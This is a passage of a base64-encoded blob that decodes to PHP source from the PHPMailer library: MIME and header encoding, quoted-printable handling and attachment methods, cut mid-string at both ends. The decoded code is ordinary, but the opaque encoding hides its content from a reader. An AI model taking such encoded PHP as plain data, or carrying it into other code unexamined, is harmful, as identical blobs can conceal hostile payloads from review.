3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZmlsZV9vcGVuJykgLiAkcGF0aCwgc2VsZjo6U1RPUF9DT05USU5VRSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkbWFnaWNfcXVvdGVzID0gZmFsc2U7DQogICAgICAgICAgICBpZiggdmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNy40LjAnLCAnPCcpICkgew0KICAgICAgICAgICAgICAgICRtYWdpY19xdW90ZXMgPSBnZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkbWFnaWNfcXVvdGVzKSB7DQogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMy4wJywgJzwnKSkgew0KICAgICAgICAgICAgICAgICAgICBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoZmFsc2UpOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIC8vRG9lc24ndCBleGlzdCBpbiBQSFAgNS40LCBidXQgd2UgZG9uJ3QgbmVlZCB0byBjaGVjayBiZWNhdXNlDQogICAgICAgICAgICAgICAgICAgIC8vZ2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lIGFsd2F5cyByZXR1cm5zIGZhbHNlIGluIDUuNCsNCiAgICAgICAgICAgICAgICAgICAgLy9zbyBpdCB3aWxsIG5ldmVyIGdldCBoZXJlDQogICAgICAgICAgICAgICAgICAgIGluaV9zZXQoJ21hZ2ljX3F1b3Rlc19ydW50aW1lJywgZmFsc2UpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoKTsNCiAgICAgICAgICAgICRmaWxlX2J1ZmZlciA9ICR0aGlzLT5lbmNvZGVTdHJpbmcoJGZpbGVfYnVmZmVyLCAkZW5jb2RpbmcpOw0KICAgICAgICAgICAgaWYgKCRtYWdpY19xdW90ZXMpIHsNCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnLCAnPCcpKSB7DQogICAgICAgICAgICAgICAgICAgIHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgkbWFnaWNfcXVvdGVzKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBpbmlfc2V0KCdtYWdpY19xdW90ZXNfcnVudGltZScsICRtYWdpY19xdW90ZXMpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAkZmlsZV9idWZmZXI7DQogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIHJldHVybiAnJzsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEVuY29kZSBhIHN0cmluZyBpbiByZXF1ZXN0ZWQgZm9ybWF0Lg0KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuDQogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIFRoZSB0ZXh0IHRvIGVuY29kZQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIFRoZSBlbmNvZGluZyB0byB1c2U7IG9uZSBvZiAnYmFzZTY0JywgJzdiaXQnLCAnOGJpdCcsICdiaW5hcnknLCAncXVvdGVkLXByaW50YWJsZScNCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVN0cmluZygkc3RyLCAkZW5jb2RpbmcgPSAnYmFzZTY0JykNCiAgICB7DQogICAgICAgICRlbmNvZGVkID0gJyc7DQogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkZW5jb2RpbmcpKSB7DQogICAgICAgICAgICBjYXNlICdiYXNlNjQnOg0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gY2h1bmtfc3BsaXQoYmFzZTY0X2VuY29kZSgkc3RyKSwgNzYsICR0aGlzLT5MRSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICc3Yml0JzoNCiAgICAgICAgICAgIGNhc2UgJzhiaXQnOg0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmZpeEVPTCgkc3RyKTsNCiAgICAgICAgICAgICAgICAvLyBNYWtlIHN1cmUgaXQgZW5kcyB3aXRoIGEgbGluZSBicmVhaw0KICAgICAgICAgICAgICAgIGlmIChzdWJzdHIoJGVuY29kZWQsIC0oc3RybGVuKCR0aGlzLT5MRSkpKSAhPSAkdGhpcy0+TEUpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgLj0gJHRoaXMtPkxFOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2JpbmFyeSc6DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkc3RyOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAncXVvdGVkLXByaW50YWJsZSc6DQogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+ZW5jb2RlUVAoJHN0cik7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygnZW5jb2RpbmcnKSAuICRlbmNvZGluZyk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRlbmNvZGVkOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEVuY29kZSBhIGhlYWRlciBzdHJpbmcgb3B0aW1hbGx5Lg0KICAgICAqIFBpY2tzIHNob3J0ZXN0IG9mIFEsIEIsIHF1b3RlZC1wcmludGFibGUgb3Igbm9uZS4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHBvc2l0aW9uDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlSGVhZGVyKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0JykNCiAgICB7DQogICAgICAgICRtYXRjaGNvdW50ID0gMDsNCiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsNCiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6DQogICAgICAgICAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvW8KALcO/XS8nLCAkc3RyKSkgew0KICAgICAgICAgICAgICAgICAgICAvLyBDYW4ndCB1c2UgYWRkc2xhc2hlcyBhcyB3ZSBkb24ndCBrbm93IHRoZSB2YWx1ZSBvZiBtYWdpY19xdW90ZXNfc3liYXNlDQogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkID0gYWRkY3NsYXNoZXMoJHN0ciwgIiAuLh9/XCIiKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCgkc3RyID09ICRlbmNvZGVkKSAmJiAhcHJlZ19tYXRjaCgnL1teQS1aYS16MC05ISMkJSZcJyorXC89P15fYHt8fX4gLV0vJywgJHN0cikpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoJGVuY29kZWQpOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgiXCIkZW5jb2RlZFwiIik7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1teICEjLVtdLX5dLycsICRzdHIsICRtYXRjaGVzKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIFBocE1pc3NpbmdCcmVha1N0YXRlbWVudEluc3BlY3Rpb24gKi8NCiAgICAgICAgICAgIGNhc2UgJ2NvbW1lbnQnOg0KICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ID0gcHJlZ19tYXRjaF9hbGwoJy9bKCkiXS8nLCAkc3RyLCAkbWF0Y2hlcyk7DQogICAgICAgICAgICAgICAgLy8gSW50ZW50aW9uYWwgZmFsbC10aHJvdWdoDQogICAgICAgICAgICBjYXNlICd0ZXh0JzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgKz0gcHJlZ19tYXRjaF9hbGwoJy9bIC0IDQoMDi0ffy3Dv10vJywgJHN0ciwgJG1hdGNoZXMpOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQoNCiAgICAgICAgLy9UaGVyZSBhcmUgbm8gY2hhcnMgdGhhdCBuZWVkIGVuY29kaW5nDQogICAgICAgIGlmICgkbWF0Y2hjb3VudCA9PSAwKSB7DQogICAgICAgICAgICByZXR1cm4gKCRzdHIpOw0KICAgICAgICB9DQoNCiAgICAgICAgJG1heGxlbiA9IDc1IC0gNyAtIHN0cmxlbigkdGhpcy0+Q2hhclNldCk7DQogICAgICAgIC8vIFRyeSB0byBzZWxlY3QgdGhlIGVuY29kaW5nIHdoaWNoIHNob3VsZCBwcm9kdWNlIHRoZSBzaG9ydGVzdCBvdXRwdXQNCiAgICAgICAgaWYgKCRtYXRjaGNvdW50ID4gc3RybGVuKCRzdHIpIC8gMykgew0KICAgICAgICAgICAgLy8gTW9yZSB0aGFuIGEgdGhpcmQgb2YgdGhlIGNvbnRlbnQgd2lsbCBuZWVkIGVuY29kaW5nLCBzbyBCIGVuY29kaW5nIHdpbGwgYmUgbW9zdCBlZmZpY2llbnQNCiAgICAgICAgICAgICRlbmNvZGluZyA9ICdCJzsNCiAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ21iX3N0cmxlbicpICYmICR0aGlzLT5oYXNNdWx0aUJ5dGVzKCRzdHIpKSB7DQogICAgICAgICAgICAgICAgLy8gVXNlIGEgY3VzdG9tIGZ1bmN0aW9uIHdoaWNoIGNvcnJlY3RseSBlbmNvZGVzIGFuZCB3cmFwcyBsb25nDQogICAgICAgICAgICAgICAgLy8gbXVsdGlieXRlIHN0cmluZ3Mgd2l0aG91dCBicmVha2luZyBsaW5lcyB3aXRoaW4gYSBjaGFyYWN0ZXINCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5iYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgIg0KIik7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gYmFzZTY0X2VuY29kZSgkc3RyKTsNCiAgICAgICAgICAgICAgICAkbWF4bGVuIC09ICRtYXhsZW4gJSA0Ow0KICAgICAgICAgICAgICAgICRlbmNvZGVkID0gdHJpbShjaHVua19zcGxpdCgkZW5jb2RlZCwgJG1heGxlbiwgIg0KIikpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGVuY29kaW5nID0gJ1EnOw0KICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+ZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24pOw0KICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+d3JhcFRleHQoJGVuY29kZWQsICRtYXhsZW4sIHRydWUpOw0KICAgICAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZSgnPScgLiBzZWxmOjpDUkxGLCAiDQoiLCB0cmltKCRlbmNvZGVkKSk7DQogICAgICAgIH0NCg0KICAgICAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgnL14oLiopJC9tJywgJyA9PycgLiAkdGhpcy0+Q2hhclNldCAuICI/JGVuY29kaW5nPwE/PSIsICRlbmNvZGVkKTsNCiAgICAgICAgJGVuY29kZWQgPSB0cmltKHN0cl9yZXBsYWNlKCINCiIsICR0aGlzLT5MRSwgJGVuY29kZWQpKTsNCg0KICAgICAgICByZXR1cm4gJGVuY29kZWQ7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ2hlY2sgaWYgYSBzdHJpbmcgY29udGFpbnMgbXVsdGktYnl0ZSBjaGFyYWN0ZXJzLg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIG11bHRpLWJ5dGUgdGV4dCB0byB3cmFwIGVuY29kZQ0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXNNdWx0aUJ5dGVzKCRzdHIpDQogICAgew0KICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSkgew0KICAgICAgICAgICAgcmV0dXJuIChzdHJsZW4oJHN0cikgPiBtYl9zdHJsZW4oJHN0ciwgJHRoaXMtPkNoYXJTZXQpKTsNCiAgICAgICAgfSBlbHNlIHsgLy8gQXNzdW1lIG5vIG11bHRpYnl0ZXMgKHdlIGNhbid0IGhhbmRsZSB3aXRob3V0IG1ic3RyaW5nIGZ1bmN0aW9ucyBhbnl3YXkpDQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBEb2VzIGEgc3RyaW5nIGNvbnRhaW4gYW55IDgtYml0IGNoYXJzIChpbiBhbnkgY2hhcnNldCk/DQogICAgICogQHBhcmFtIHN0cmluZyAkdGV4dA0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXM4Yml0Q2hhcnMoJHRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgnL1vCgC3Dv10vJywgJHRleHQpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEVuY29kZSBhbmQgd3JhcCBsb25nIG11bHRpYnl0ZSBzdHJpbmdzIGZvciBtYWlsIGhlYWRlcnMNCiAgICAgKiB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3Rlci4NCiAgICAgKiBBZGFwdGVkIGZyb20gYSBmdW5jdGlvbiBieSBwYXJhdm9pZA0KICAgICAqIEBsaW5rIGh0dHA6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWItZW5jb2RlLW1pbWVoZWFkZXIucGhwIzYwMjgzDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgbXVsdGktYnl0ZSB0ZXh0IHRvIHdyYXAgZW5jb2RlDQogICAgICogQHBhcmFtIHN0cmluZyAkbGluZWJyZWFrIHN0cmluZyB0byB1c2UgYXMgbGluZWZlZWQvZW5kLW9mLWxpbmUNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBiYXNlNjRFbmNvZGVXcmFwTUIoJHN0ciwgJGxpbmVicmVhayA9IG51bGwpDQogICAgew0KICAgICAgICAkc3RhcnQgPSAnPT8nIC4gJHRoaXMtPkNoYXJTZXQgLiAnP0I/JzsNCiAgICAgICAgJGVuZCA9ICc/PSc7DQogICAgICAgICRlbmNvZGVkID0gJyc7DQogICAgICAgIGlmICgkbGluZWJyZWFrID09PSBudWxsKSB7DQogICAgICAgICAgICAkbGluZWJyZWFrID0gJHRoaXMtPkxFOw0KICAgICAgICB9DQoNCiAgICAgICAgJG1iX2xlbmd0aCA9IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7DQogICAgICAgIC8vIEVhY2ggbGluZSBtdXN0IGhhdmUgbGVuZ3RoIDw9IDc1LCBpbmNsdWRpbmcgJHN0YXJ0IGFuZCAkZW5kDQogICAgICAgICRsZW5ndGggPSA3NSAtIHN0cmxlbigkc3RhcnQpIC0gc3RybGVuKCRlbmQpOw0KICAgICAgICAvLyBBdmVyYWdlIG11bHRpLWJ5dGUgcmF0aW8NCiAgICAgICAgJHJhdGlvID0gJG1iX2xlbmd0aCAvIHN0cmxlbigkc3RyKTsNCiAgICAgICAgLy8gQmFzZTY0IGhhcyBhIDQ6MyByYXRpbw0KICAgICAgICAkYXZnTGVuZ3RoID0gZmxvb3IoJGxlbmd0aCAqICRyYXRpbyAqIC43NSk7DQoNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJG1iX2xlbmd0aDsgJGkgKz0gJG9mZnNldCkgew0KICAgICAgICAgICAgJGxvb2tCYWNrID0gMDsNCiAgICAgICAgICAgIGRvIHsNCiAgICAgICAgICAgICAgICAkb2Zmc2V0ID0gJGF2Z0xlbmd0aCAtICRsb29rQmFjazsNCiAgICAgICAgICAgICAgICAkY2h1bmsgPSBtYl9zdWJzdHIoJHN0ciwgJGksICRvZmZzZXQsICR0aGlzLT5DaGFyU2V0KTsNCiAgICAgICAgICAgICAgICAkY2h1bmsgPSBiYXNlNjRfZW5jb2RlKCRjaHVuayk7DQogICAgICAgICAgICAgICAgJGxvb2tCYWNrKys7DQogICAgICAgICAgICB9IHdoaWxlIChzdHJsZW4oJGNodW5rKSA+ICRsZW5ndGgpOw0KICAgICAgICAgICAgJGVuY29kZWQgLj0gJGNodW5rIC4gJGxpbmVicmVhazsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIENob21wIHRoZSBsYXN0IGxpbmVmZWVkDQogICAgICAgICRlbmNvZGVkID0gc3Vic3RyKCRlbmNvZGVkLCAwLCAtc3RybGVuKCRsaW5lYnJlYWspKTsNCiAgICAgICAgcmV0dXJuICRlbmNvZGVkOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEVuY29kZSBhIHN0cmluZyBpbiBxdW90ZWQtcHJpbnRhYmxlIGZvcm1hdC4NCiAgICAgKiBBY2NvcmRpbmcgdG8gUkZDMjA0NSBzZWN0aW9uIDYuNy4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyBUaGUgdGV4dCB0byBlbmNvZGUNCiAgICAgKiBAcGFyYW0gaW50ZWdlciAkbGluZV9tYXggTnVtYmVyIG9mIGNoYXJzIGFsbG93ZWQgb24gYSBsaW5lIGJlZm9yZSB3cmFwcGluZw0KICAgICAqIEByZXR1cm4gc3RyaW5nDQogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5xdW90ZWQtcHJpbnRhYmxlLWRlY29kZS5waHAjODk0MTcgQWRhcHRlZCBmcm9tIHRoaXMgY29tbWVudA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUCgkc3RyaW5nLCAkbGluZV9tYXggPSA3NikNCiAgICB7DQogICAgICAgIC8vIFVzZSBuYXRpdmUgZnVuY3Rpb24gaWYgaXQncyBhdmFpbGFibGUgKD49IFBIUDUuMykNCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncXVvdGVkX3ByaW50YWJsZV9lbmNvZGUnKSkgew0KICAgICAgICAgICAgcmV0dXJuIHF1b3RlZF9wcmludGFibGVfZW5jb2RlKCRzdHJpbmcpOw0KICAgICAgICB9DQogICAgICAgIC8vIEZhbGwgYmFjayB0byBhIHB1cmUgUEhQIGltcGxlbWVudGF0aW9uDQogICAgICAgICRzdHJpbmcgPSBzdHJfcmVwbGFjZSgNCiAgICAgICAgICAgIGFycmF5KCclMjAnLCAnJTBEJTBBLicsICclMEQlMEEnLCAnJScpLA0KICAgICAgICAgICAgYXJyYXkoJyAnLCAiDQo9MkUiLCAiDQoiLCAnPScpLA0KICAgICAgICAgICAgcmF3dXJsZW5jb2RlKCRzdHJpbmcpDQogICAgICAgICk7DQogICAgICAgIHJldHVybiBwcmVnX3JlcGxhY2UoJy9bXg0KXXsnIC4gKCRsaW5lX21heCAtIDMpIC4gJ31bXj0NCl17Mn0vJywgIiQwPQ0KIiwgJHN0cmluZyk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQmFja3dhcmQgY29tcGF0aWJpbGl0eSB3cmFwcGVyIGZvciBhbiBvbGQgUVAgZW5jb2RpbmcgZnVuY3Rpb24gdGhhdCB3YXMgcmVtb3ZlZC4NCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6ZW5jb2RlUVAoKQ0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nDQogICAgICogQHBhcmFtIGludGVnZXIgJGxpbmVfbWF4DQogICAgICogQHBhcmFtIGJvb2xlYW4gJHNwYWNlX2NvbnYNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqIEBkZXByZWNhdGVkIFVzZSBlbmNvZGVRUCBpbnN0ZWFkLg0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUHBocCgNCiAgICAgICAgJHN0cmluZywNCiAgICAgICAgJGxpbmVfbWF4ID0gNzYsDQogICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIFBocFVudXNlZFBhcmFtZXRlckluc3BlY3Rpb24gKi8gJHNwYWNlX2NvbnYgPSBmYWxzZQ0KICAgICkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmVuY29kZVFQKCRzdHJpbmcsICRsaW5lX21heCk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogRW5jb2RlIGEgc3RyaW5nIHVzaW5nIFEgZW5jb2RpbmcuDQogICAgICogQGxpbmsgaHR0cDovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjMjA0Nw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciB0aGUgdGV4dCB0byBlbmNvZGUNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwb3NpdGlvbiBXaGVyZSB0aGUgdGV4dCBpcyBnb2luZyB0byBiZSB1c2VkLCBzZWUgdGhlIFJGQyBmb3Igd2hhdCB0aGF0IG1lYW5zDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0JykNCiAgICB7DQogICAgICAgIC8vIFRoZXJlIHNob3VsZCBub3QgYmUgYW55IEVPTCBpbiB0aGUgc3RyaW5nDQogICAgICAgICRwYXR0ZXJuID0gJyc7DQogICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoYXJyYXkoIg0KIiwgIg0KIiksICcnLCAkc3RyKTsNCiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsNCiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6DQogICAgICAgICAgICAgICAgLy8gUkZDIDIwNDcgc2VjdGlvbiA1LjMNCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdeQS1aYS16MC05ISorXC8gLSc7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAvKiogQG5vaW5zcGVjdGlvbiBQaHBNaXNzaW5nQnJlYWtTdGF0ZW1lbnRJbnNwZWN0aW9uICovDQogICAgICAgICAgICBjYXNlICdjb21tZW50JzoNCiAgICAgICAgICAgICAgICAvLyBSRkMgMjA0NyBzZWN0aW9uIDUuMg0KICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ1woXCkiJzsNCiAgICAgICAgICAgICAgICAvLyBpbnRlbnRpb25hbCBmYWxsLXRocm91Z2gNCiAgICAgICAgICAgICAgICAvLyBmb3IgdGhpcyByZWFzb24gd2UgYnVpbGQgdGhlICRwYXR0ZXJuIHdpdGhvdXQgaW5jbHVkaW5nIGRlbGltaXRlcnMgYW5kIFtdDQogICAgICAgICAgICBjYXNlICd0ZXh0JzoNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgLy8gUkZDIDIwNDcgc2VjdGlvbiA1LjENCiAgICAgICAgICAgICAgICAvLyBSZXBsYWNlIGV2ZXJ5IGhpZ2ggYXNjaWksIGNvbnRyb2wsID0sID8gYW5kIF8gY2hhcmFjdGVycw0KICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJyAtCQ0KDA4tHz0/X38tw78nIC4gJHBhdHRlcm47DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIH0NCiAgICAgICAgJG1hdGNoZXMgPSBhcnJheSgpOw0KICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoIi9beyRwYXR0ZXJufV0vIiwgJGVuY29kZWQsICRtYXRjaGVzKSkgew0KICAgICAgICAgICAgLy8gSWYgdGhlIHN0cmluZyBjb250YWlucyBhbiAnPScsIG1ha2Ugc3VyZSBpdCdzIHRoZSBmaXJzdCB0aGluZyB3ZSByZXBsYWNlDQogICAgICAgICAgICAvLyBzbyBhcyB0byBhdm9pZCBkb3VibGUtZW5jb2RpbmcNCiAgICAgICAgICAgICRlcWtleSA9IGFycmF5X3NlYXJjaCgnPScsICRtYXRjaGVzWzBdKTsNCiAgICAgICAgICAgIGlmIChmYWxzZSAhPT0gJGVxa2V5KSB7DQogICAgICAgICAgICAgICAgdW5zZXQoJG1hdGNoZXNbMF1bJGVxa2V5XSk7DQogICAgICAgICAgICAgICAgYXJyYXlfdW5zaGlmdCgkbWF0Y2hlc1swXSwgJz0nKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X3VuaXF1ZSgkbWF0Y2hlc1swXSkgYXMgJGNoYXIpIHsNCiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHN0cl9yZXBsYWNlKCRjaGFyLCAnPScgLiBzcHJpbnRmKCclMDJYJywgb3JkKCRjaGFyKSksICRlbmNvZGVkKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAvLyBSZXBsYWNlIGV2ZXJ5IHNwYWNlcyB0byBfIChtb3JlIHJlYWRhYmxlIHRoYW4gPTIwKQ0KICAgICAgICByZXR1cm4gc3RyX3JlcGxhY2UoJyAnLCAnXycsICRlbmNvZGVkKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgYSBzdHJpbmcgb3IgYmluYXJ5IGF0dGFjaG1lbnQgKG5vbi1maWxlc3lzdGVtKS4NCiAgICAgKiBUaGlzIG1ldGhvZCBjYW4gYmUgdXNlZCB0byBhdHRhY2ggYXNjaWkgb3IgYmluYXJ5IGRhdGEsDQogICAgICogc3VjaCBhcyBhIEJMT0IgcmVjb3JkIGZyb20gYSBkYXRhYmFzZS4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgU3RyaW5nIGF0dGFjaG1lbnQgZGF0YS4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZSBOYW1lIG9mIHRoZSBhdHRhY2htZW50Lg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgRmlsZSBleHRlbnNpb24gKE1JTUUpIHR5cGUuDQogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlDQogICAgICogQHJldHVybiB2b2lkDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGFkZFN0cmluZ0F0dGFjaG1lbnQoDQogICAgICAgICRzdHJpbmcsDQogICAgICAgICRmaWxlbmFtZSwNCiAgICAgICAgJGVuY29kaW5nID0gJ2Jhc2U2NCcsDQogICAgICAgICR0eXBlID0gJycsDQogICAgICAgICRkaXNwb3NpdGlvbiA9ICdhdHRhY2htZW50Jw0KICAgICkgew0KICAgICAgICAvLyBJZiBhIE1JTUUgdHlwZSBpcyBub3Qgc3BlY2lmaWVkLCB0cnkgdG8gd29yayBpdCBvdXQgZnJvbSB0aGUgZmlsZSBuYW1lDQogICAgICAgIGlmICgkdHlwZSA9PSAnJykgew0KICAgICAgICAgICAgJHR5cGUgPSBzZWxmOjpmaWxlbmFtZVRvVHlwZSgkZmlsZW5hbWUpOw0KICAgICAgICB9DQogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQ0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoDQogICAgICAgICAgICAwID0+ICRzdHJpbmcsDQogICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwNCiAgICAgICAgICAgIDIgPT4gYmFzZW5hbWUoJGZpbGVuYW1lKSwNCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLA0KICAgICAgICAgICAgNCA9PiAkdHlwZSwNCiAgICAgICAgICAgIDUgPT4gdHJ1ZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50DQogICAgICAgICAgICA2I